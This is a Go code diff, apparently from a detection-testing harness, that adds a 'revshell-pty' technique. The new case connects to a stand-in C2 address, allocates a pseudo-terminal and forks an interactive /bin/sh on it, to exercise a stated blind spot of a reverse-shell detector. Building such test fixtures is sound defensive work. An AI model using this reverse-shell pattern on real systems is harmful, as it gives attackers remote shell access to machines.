@@ -79,6 +79,16 @@ var vivos []any
 // classificação sem que nada saia para a internet.
 const destinoC2 = "203.0.113.5:4444"
 
+// ioctls do PTY (amd64).
+const (
+	tiocGPTN   = 0x80045430
+	tiocSPTLCK = 0x40045431
+)
+
+func ioctl(fd, req, arg uintptr) {
+	syscall.Syscall(syscall.SYS_IOCTL, fd, req, arg)
+}
+
 func socketFD(c net.Conn) int {
 	f, err := c.(*net.TCPConn).File()
 	must(err, "file do socket")
@@ -178,6 +188,29 @@ func main() {
 		must(err, "forkexec sh")
 		r.Close() // só o shell precisa da leitura
 		fmt.Printf("PLANT pid=%d tech=revshell-bridge\n", shPid)
+		os.Stdout.Sync()
+
+	case "revshell-pty": // ponte por PTY: o revshell_bridge só cobre pipe, e o
+		// PTY não compartilha inode de pipe — o ponto cego declarado.
+		c, err := net.Dial("tcp", destinoC2)
+		must(err, "dial")
+		_ = socketFD(c) // a ponte segura o socket
+		ptmx, err := os.OpenFile("/dev/ptmx", os.O_RDWR, 0)
+		must(err, "abrir /dev/ptmx")
+		vivos = append(vivos, ptmx)
+		var lock int
+		ioctl(ptmx.Fd(), tiocSPTLCK, uintptr(unsafe.Pointer(&lock)))
+		var n uint32
+		ioctl(ptmx.Fd(), tiocGPTN, uintptr(unsafe.Pointer(&n)))
+		slave, err := os.OpenFile(fmt.Sprintf("/dev/pts/%d", n), os.O_RDWR, 0)
+		must(err, "abrir o slave do pty")
+		// o shell REAL com stdin/stdout/stderr = slave do PTY.
+		shPid, err := syscall.ForkExec("/bin/sh", []string{"sh", "-i"}, &syscall.ProcAttr{
+			Files: []uintptr{slave.Fd(), slave.Fd(), slave.Fd()},
+		})
+		must(err, "forkexec sh")
+		slave.Close()
+		fmt.Printf("PLANT pid=%d tech=revshell-pty\n", shPid)
 		os.Stdout.Sync()
 
 	default:
